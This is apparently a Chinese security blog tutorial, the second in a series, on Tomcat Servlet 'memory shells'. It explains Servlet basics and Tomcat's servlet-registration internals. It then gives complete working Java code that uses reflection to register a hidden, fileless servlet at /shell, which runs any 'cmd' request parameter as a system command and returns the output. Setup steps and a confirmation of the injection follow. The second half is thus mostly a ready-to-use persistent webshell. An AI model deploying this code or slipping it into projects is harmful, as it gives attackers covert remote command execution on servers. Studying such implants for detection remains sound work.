## 写在前面

今天给大家带来的是内存马系列文章第二篇，继上一篇深入讲解Filter内存马，这里带来的是Servlet内存马。

## 前置

### 什么是Servlet?

Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP
服务器上的数据库或应用程序之间的中间层。

使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。

Java Servlet 通常情况下与使用 CGI（Common Gateway
Interface，公共网关接口）实现的程序可以达到异曲同工的效果，来浅看一下Servlet的架构图。

![image-20220911104531854.png](https://image.3001.net/images/20220911/1662894991_631dc38fcb21613771d2a.png!small)

发挥的作用

>   * 读取客户端（浏览器）发送的显式的数据。这包括网页上的 HTML 表单，或者也可以是来自 applet 或自定义的 HTTP 客户端程序的表单。
>
>   * 读取客户端（浏览器）发送的隐式的 HTTP 请求数据。这包括 cookies、媒体类型和浏览器能理解的压缩格式等等。
>
>   * 处理数据并生成结果。这个过程可能需要访问数据库，执行 RMI 或 CORBA 调用，调用 Web 服务，或者直接计算得出对应的响应。
>
>   * 发送显式的数据（即文档）到客户端（浏览器）。该文档的格式可以是多种多样的，包括文本文件（HTML 或 XML）、二进制文件（GIF
> 图像）、Excel 等。
>
>   * 发送隐式的 HTTP 响应到客户端（浏览器）。这包括告诉浏览器或其他客户端被返回的文档类型（例如 HTML），设置 cookies
> 和缓存参数，以及其他类似的任务
>
>

### 简单的Servlet案例

对于Servlet的创建方式有三种：

  1. 实现`javax.servlet.Servlet`接口的方式。
    
        public class ServletTest implements Servlet {
        @Override
        public void init(ServletConfig config) throws ServletException {
            System.out.println("init.....");
        }
    
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
    
        @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            System.out.println("service.....");
        }
    
        @Override
        public String getServletInfo() {
            return null;
        }
    
        @Override
        public void destroy() {
            System.out.println("destroy.....");
        }
    }
    

其中的`init`是在Servlet被创建的时候才会执行的方法，而`service`就是对客户端进行相应的方法逻辑，在`destroy`就是在该Servlet被销毁的时候会调用的方法，至于其余两个方法`getServletConfig`/`getServletInfo`都是一些非生命周期的调用

我们来运行一下这个Servelt查看调用

![image-20220911110745989.png](https://image.3001.net/images/20220911/1662895009_631dc3a18faa4f322585b.png!small)

能够成功执行这个servlet方法

  2. 或者是继承`GenericServlet`类创建Servlet
    
        public class ServletDemo2 extends GenericServlet {
    
        @Override
        public void service(ServletRequest arg0, ServletResponse arg1)
                throws ServletException, IOException {
            System.out.println("service....");
    
        }
    }
    

  3. 又或者是继承了`HttpServlet`进行创建
    
        public class ServletDemo3 extends HttpServlet {
    
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp)
                throws ServletException, IOException {
            System.out.println("doGet...");
        }
    
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp)
                throws ServletException, IOException {
            System.out.println("doPost...");
            doGet(req,resp);
        }
    
    }
    

其实看似使用三种创建Servlet的方式，但是实际上也是同一种方法进行创建的，是不同的的封装罢了。

![image-20220911111822833.png](https://image.3001.net/images/20220911/1662895020_631dc3ac41509edfb148b.png!small)

由上图可知：

  1. GenericServlet 是实现了 Servlet 接口的抽象类。

  2. HttpServlet 是 GenericServlet 的子类，具有 GenericServlet 的一切特性。

  3. Servlet 程序（MyServlet 类）是一个实现了 Servlet 接口的 Java 类。

### 分析流程

接下来简单分析一下采用实现`javax.servlet.Servlet`接口的方法触发对应Servlet的service方法的过程。

简单放一下调用栈

    
    
    service:19, ServletTest (pres.test.momenshell)
    internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
    doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
    doFilter:52, WsFilter (org.apache.tomcat.websocket.server)
    internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
    doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
    invoke:196, StandardWrapperValve (org.apache.catalina.core)
    invoke:97, StandardContextValve (org.apache.catalina.core)
    invoke:542, AuthenticatorBase (org.apache.catalina.authenticator)
    invoke:135, StandardHostValve (org.apache.catalina.core)
    invoke:81, ErrorReportValve (org.apache.catalina.valves)
    invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)
    invoke:78, StandardEngineValve (org.apache.catalina.core)
    service:364, CoyoteAdapter (org.apache.catalina.connector)
    service:624, Http11Processor (org.apache.coyote.http11)
    process:65, AbstractProcessorLight (org.apache.coyote)
    process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)
    doRun:1673, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
    run:49, SocketProcessorBase (org.apache.tomcat.util.net)
    runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
    run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
    run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
    run:748, Thread (java.lang)
    

从上面的调用栈，我们可以知道在调用Servlet类的service方法之前首先调用了`ApplicationFilterChain#doFilter`方法，变相明白了，Filter的执行是在Servlet之前的

好吧，也没啥流程好分析的。还是进入正文吧

## 正文

### 分析注入方式

同样需要通过代码层面达到Servlet的构建，而不通过xml配置文件添加映射

同样是在`javax.servlet.ServletContext`接口中声明了几个和Servlet创建相关的方法。

![image-20220911113244855.png](https://image.3001.net/images/20220911/1662895029_631dc3b5a3aa8f5b27805.png!small)

我们来到createServlet详细看一下。

![image-20220911113311544.png](https://image.3001.net/images/20220911/1662895038_631dc3be0b03931038ef5.png!small)

> The returned Servlet instance may be further customized before it is
> registered with this ServletContext via a call to addServlet(String,
> Servlet).

从其注释中我们可以知道他是通过`addServlet`方法的调用来创建Servlet类的

他在Tomcat容器中的实现为`org.apache.catalina.core.ApplicationContext#createServlet`方法。

![image-20220911113610306.png](https://image.3001.net/images/20220911/1662895045_631dc3c55a3e1f029562f.png!small)

来到`addServlet`的声明。

![image-20220911113707044.png](https://image.3001.net/images/20220911/1662895052_631dc3cc1a73e9fb2ccc0.png!small)

同样是存在三种重载方法，通过传入ServletName / ServletClass 来返回了一个ServletRegistration.Dynamic类型

他在Tomcat容器中的实现。

![image-20220911114227568.png](https://image.3001.net/images/20220911/1662895060_631dc3d451b0ce0982596.png!small)

来解读这一段代码

  1. 首先同样会判断当前程序是否处于运行状态，如果处在运行状态就会抛出异常

  2. 之后将会在`context`中通过`servletName`查找对应的child并将其转化为Wrapper对象

  3. 如果没有找到，将会创建一个Wrapper对象，在添加进入`servletName`之后将wrapper添加进入context的child中去

  4. 如果servlet为空的话，将会创建一个ServletClass, 并加载这个Class

  5. 之后如果存在初始化参数的时候，将进行初始化操作

  6. 最后创建了一个`ApplicationServletRegistration`类，通过带入wrapper和context

同样有着程序在运行过程中不能够添加Servlet的限制

那么，如何绕过呢？

我们可以关注到`ApplicationServletRegistration#addMapping`这个方法中。

![image-20220911133647153.png](https://image.3001.net/images/20220911/1662895068_631dc3dc733b3b4b66b70.png!small)

通过调用了`StardContext#addServletMappingDecoded`方法传入了url映射，在mapper中添加 URL 路径与
Wrapper 对象的映射。

![image-20220911134039951.png](https://image.3001.net/images/20220911/1662895075_631dc3e3f03e5bfd3e38c.png!small)

同时其wrapper是通过调用`findChild`带上ServletName获取到的，之后通过wrapper.addMapping增添了映射，很明显，大概的流程我们已经知道了。

  1. 首先需要创建一个自定义的Servlet类

  2. 之后通过Wrapper对其进行封装

  3. 再将封装之后的wrapper添加进入`StandardContext`类中的children中去

  4. 最后通过调用addServletMappingDecoded方法添加url映射

### 手写内存马

有了上面分析的基础之后我们可以开始构造我们的Servlet内存马

同样，首先需要获取到`StandardContext`对象，这里采用了循环获取的方式，知道获取到`StandardContext`对象。

    
    
    // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
    while (o == null) {
        Field f = servletContext.getClass().getDeclaredField("context");
        f.setAccessible(true);
        Object object = f.get(servletContext);
    
        if (object instanceof ServletContext) {
            servletContext = (ServletContext) object;
        } else if (object instanceof StandardContext) {
            o = (StandardContext) object;
        }
    }
    

之后创建一个自定义的`Servlet`, 这里同样是实现了`cmd`传参任意命令执行的逻辑。

    
    
    //自定义servlet
    Servlet servlet = new Servlet() {
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {
    
        }
    
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
    
        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("cmd");
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }
    
        @Override
        public String getServletInfo() {
            return null;
        }
    
        @Override
        public void destroy() {
    
        }
    };
    

之后将该Servlet通过Wrapper进行封装, 并将Wrapper添加进入children中去。

    
    
    //用Wrapper封装servlet
    Wrapper newWrapper = o.createWrapper();
    newWrapper.setName(name);
    newWrapper.setLoadOnStartup(1);
    newWrapper.setServlet(servlet);
    
    //向children中添加Wrapper
    o.addChild(newWrapper);
    

最后调用方法进行url映射。

    
    
    //添加servlet的映射
    o.addServletMappingDecoded("/shell", name);
    

完整的内存马

    
    
    package pres.test.momenshell;
    
    import org.apache.catalina.Wrapper;
    import org.apache.catalina.core.StandardContext;
    
    import javax.servlet.*;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    import java.io.InputStream;
    import java.io.PrintWriter;
    import java.lang.reflect.Field;
    import java.util.Scanner;
    
    public class AddTomcatServlet extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            this.doPost(req, resp);
        }
    
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            try {
                String name = "RoboTerh";
                //从req中获取ServletContext对象
                ServletContext servletContext = req.getServletContext();
                if (servletContext.getServletRegistration(name) == null) {
                    StandardContext o = null;
    
                    // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                    while (o == null) {
                        Field f = servletContext.getClass().getDeclaredField("context");
                        f.setAccessible(true);
                        Object object = f.get(servletContext);
    
                        if (object instanceof ServletContext) {
                            servletContext = (ServletContext) object;
                        } else if (object instanceof StandardContext) {
                            o = (StandardContext) object;
                        }
                    }
    
                    //自定义servlet
                    Servlet servlet = new Servlet() {
                        @Override
                        public void init(ServletConfig servletConfig) throws ServletException {
    
                        }
    
                        @Override
                        public ServletConfig getServletConfig() {
                            return null;
                        }
    
                        @Override
                        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
                            String cmd = servletRequest.getParameter("cmd");
                            boolean isLinux = true;
                            String osTyp = System.getProperty("os.name");
                            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                                isLinux = false;
                            }
                            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                            Scanner s = new Scanner(in).useDelimiter("\\a");
                            String output = s.hasNext() ? s.next() : "";
                            PrintWriter out = servletResponse.getWriter();
                            out.println(output);
                            out.flush();
                            out.close();
                        }
    
                        @Override
                        public String getServletInfo() {
                            return null;
                        }
    
                        @Override
                        public void destroy() {
    
                        }
                    };
    
                    //用Wrapper封装servlet
                    Wrapper newWrapper = o.createWrapper();
                    newWrapper.setName(name);
                    newWrapper.setLoadOnStartup(1);
                    newWrapper.setServlet(servlet);
    
                    //向children中添加Wrapper
                    o.addChild(newWrapper);
                    //添加servlet的映射
                    o.addServletMappingDecoded("/shell", name);
    
                    PrintWriter printWriter = resp.getWriter();
                    printWriter.println("servlet added");
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    

### 内存马的使用示例

观察上面的内存马你可以知道是将内存马的payload执行部分放在了doPost过程中，且在doGet方法中调用doPost，所以一旦我们访问这里httpServlet，将会执行我们的payload,
达到注入内存马的目的。

这只是一个案例，其实完全可以搭建一个CC依赖获取其他可以进行反序列化的的链子，通过反序列化的方式注入内存马的方式更加常见一些。

我们在web.xml中添加这个httpServlet的url映射。

    
    
    <servlet>
        <servlet-name>AddTomcatServlet</servlet-name>
        <servlet-class>pres.test.momenshell.AddTomcatServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>AddTomcatServlet</servlet-name>
        <url-pattern>/addTomcatServlet</url-pattern>
    </servlet-mapping>
    

开启tomcat之后访问这个路由。

![image-20220911140154177.png](https://image.3001.net/images/20220911/1662895094_631dc3f6e79f448f8e15d.png!small)

成功执行

验证内存马的存在性

![image-20220911140231658.png](https://image.3001.net/images/20220911/1662895101_631dc3fda4bf77529cc86.png!small)

可以知道我们web.xml中并没有添加shell路由但是存在shell路由，成功注入了内存马。

## 总结

Servlet存马的创建流程

  * 创建恶意Servlet

  * 用Wrapper对其进行封装

  * 添加封装后的恶意Wrapper到StandardContext的children当中

  * 添加ServletMapping将访问的URL和Servlet进行绑定

